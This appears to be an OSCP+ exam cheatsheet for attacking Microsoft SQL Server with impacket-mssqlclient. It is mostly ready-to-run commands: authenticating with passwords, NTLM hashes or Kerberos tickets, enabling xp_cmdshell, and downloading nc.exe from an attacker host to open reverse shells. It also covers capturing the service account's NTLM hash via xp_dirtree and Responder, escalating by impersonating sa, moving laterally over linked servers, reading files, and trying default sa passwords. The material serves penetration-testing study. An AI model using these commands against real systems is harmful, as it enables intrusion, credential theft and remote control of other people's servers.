# impacket-mssqlclient - MSSQL Exploitation Cheatsheet (OSCP+)

impacket-mssqlclient connects to Microsoft SQL Server and gives you an interactive SQL shell. From there you can enumerate databases, enable xp_cmdshell to run OS commands, and escalate privileges. MSSQL running as a high-privilege service account is a common OSCP+ attack path.

---

### Connect to MSSQL

#### With Password

```bash
# Windows authentication (domain user)
impacket-mssqlclient domain.local/username:'password'@10.10.10.5 -windows-auth

# SQL authentication (local SQL user)
impacket-mssqlclient username:'password'@10.10.10.5

# SA account (SQL admin)
impacket-mssqlclient sa:'password'@10.10.10.5
```

#### With NTLM Hash

```bash
impacket-mssqlclient username@10.10.10.5 -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH -windows-auth
```

#### With Kerberos Ticket

```bash
export KRB5CCNAME=username.ccache
impacket-mssqlclient -k -no-pass domain.local/username@DC01.domain.local -windows-auth
```

#### Specify Port

```bash
# If MSSQL is on a non-default port
impacket-mssqlclient username:'password'@10.10.10.5 -port 1434
```

---

### Database Enumeration

```sql
-- List all databases
SELECT name FROM master.dbo.sysdatabases;

-- Current database
SELECT DB_NAME();

-- Current user
SELECT SYSTEM_USER;
SELECT USER_NAME();

-- Check if we are sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');
-- Returns 1 = yes, 0 = no

-- List all tables in current database
SELECT * FROM information_schema.tables;

-- List tables in a specific database
SELECT * FROM databasename.information_schema.tables;

-- Read data from a table
SELECT * FROM databasename.dbo.tablename;

-- Search for interesting columns (passwords, users)
SELECT table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%pass%';
SELECT table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%user%';
```

---

### Enable xp_cmdshell (Command Execution)

This is the main attack — if you have sysadmin rights, you can enable xp_cmdshell and run OS commands.

#### Method 1: Using enable_xp_cmdshell (impacket built-in)

```bash
# Inside mssqlclient shell
enable_xp_cmdshell
```

That's it. impacket has a built-in shortcut.

#### Method 2: Manual SQL Commands

```sql
-- Enable advanced options
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;

-- Enable xp_cmdshell
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

#### Run OS Commands

```sql
-- Check who the SQL service is running as
EXECUTE xp_cmdshell 'whoami';

-- Network info
EXECUTE xp_cmdshell 'ipconfig /all';

-- List files
EXECUTE xp_cmdshell 'dir C:\Users\';

-- Check privileges
EXECUTE xp_cmdshell 'whoami /priv';
```

---

### Get a Reverse Shell

#### Method 1: Download and Execute nc.exe

```sql
-- Download nc.exe from your Kali
EXECUTE xp_cmdshell 'certutil -urlcache -f http://KALI_IP/nc.exe C:\Users\Public\nc.exe';

-- Connect back
EXECUTE xp_cmdshell 'C:\Users\Public\nc.exe KALI_IP 4444 -e cmd.exe';
```

#### Method 2: PowerShell Reverse Shell

```sql
EXECUTE xp_cmdshell 'powershell -e BASE64_ENCODED_PAYLOAD_HERE';
```

Generate the payload on Kali:

```bash
# Generate base64 encoded PowerShell reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f exe -o shell.exe

# Or use a PowerShell one-liner (encode it with base64)
```

#### Method 3: Using SMB Server

```bash
# On Kali
impacket-smbserver share /home/kali/tools/ -smb2support
nc -nvlp 4444
```

```sql
-- On MSSQL - run nc directly from share
EXECUTE xp_cmdshell '\\KALI_IP\share\nc.exe KALI_IP 4444 -e cmd.exe';
```

---

### Steal NTLM Hash (If xp_cmdshell is Disabled)

If you can't enable xp_cmdshell but have some SQL access, you can steal the service account's NTLM hash.

#### Start Responder on Kali

```bash
sudo responder -I tun0
```

#### Force MSSQL to Authenticate to You

```sql
-- This makes MSSQL connect to your SMB and leak the hash
EXEC master..xp_dirtree '\\KALI_IP\share';

-- Or
EXEC master..xp_fileexist '\\KALI_IP\share\file';
```

Responder will capture the NTLMv2 hash. Crack it:

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

---

### Linked Servers (Lateral Movement)

MSSQL servers can be linked to other SQL servers. You can execute commands on linked servers.

```sql
-- Find linked servers
EXEC sp_linkedservers;
SELECT * FROM sys.servers;

-- Execute query on linked server
EXEC ('SELECT SYSTEM_USER') AT [LINKED_SERVER_NAME];
EXEC ('SELECT IS_SRVROLEMEMBER(''sysadmin'')') AT [LINKED_SERVER_NAME];

-- Enable xp_cmdshell on linked server
EXEC ('EXECUTE sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [LINKED_SERVER_NAME];
EXEC ('EXECUTE sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LINKED_SERVER_NAME];

-- Run command on linked server
EXEC ('EXECUTE xp_cmdshell ''whoami'';') AT [LINKED_SERVER_NAME];
```

---

### Privilege Escalation via MSSQL

#### Impersonate Another User

```sql
-- Check who you can impersonate
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';

-- Impersonate sa
EXECUTE AS LOGIN = 'sa';

-- Verify
SELECT SYSTEM_USER;

-- Now enable xp_cmdshell as sa
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';
```

#### Read Files

```sql
-- Read local files
SELECT * FROM OPENROWSET(BULK N'C:\inetpub\wwwroot\web.config', SINGLE_CLOB) AS Contents;
SELECT * FROM OPENROWSET(BULK N'C:\Users\Administrator\Desktop\proof.txt', SINGLE_CLOB) AS Contents;
```

---

### OSCP+ Exam Workflow

```bash
# Step 1: Check MSSQL access with NetExec
nxc mssql 10.10.10.5 -u username -p 'password'
nxc mssql 10.10.10.5 -u username -p 'password' --local-auth

# Step 2: Connect
impacket-mssqlclient domain.local/username:'password'@10.10.10.5 -windows-auth

# Step 3: Check if sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');

# Step 4a: If sysadmin = 1 → enable xp_cmdshell
enable_xp_cmdshell
EXECUTE xp_cmdshell 'whoami';

# Step 4b: If sysadmin = 0 → try impersonation
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
EXECUTE AS LOGIN = 'sa';

# Step 5: Get reverse shell
EXECUTE xp_cmdshell 'certutil -urlcache -f http://KALI_IP/nc.exe C:\Users\Public\nc.exe';
EXECUTE xp_cmdshell 'C:\Users\Public\nc.exe KALI_IP 4444 -e cmd.exe';

# Step 6: Check linked servers for lateral movement
EXEC sp_linkedservers;
```

---

### Pro Tips

- Always try `-windows-auth` first — domain accounts usually have more access
- `enable_xp_cmdshell` is an impacket shortcut — saves typing the full SQL commands
- If xp_cmdshell is blocked, try stealing the hash with `xp_dirtree` + Responder
- MSSQL service often runs as a high-privilege account — check `whoami /priv` for SeImpersonatePrivilege
- If you see SeImpersonatePrivilege → use PrintSpoofer or GodPotato for SYSTEM
- Always check linked servers — they can give you access to other machines in the AD set
- Check for impersonation rights before giving up — you might be able to become sa
- Common MSSQL credentials to try: `sa:sa`, `sa:password`, `sa:Password1`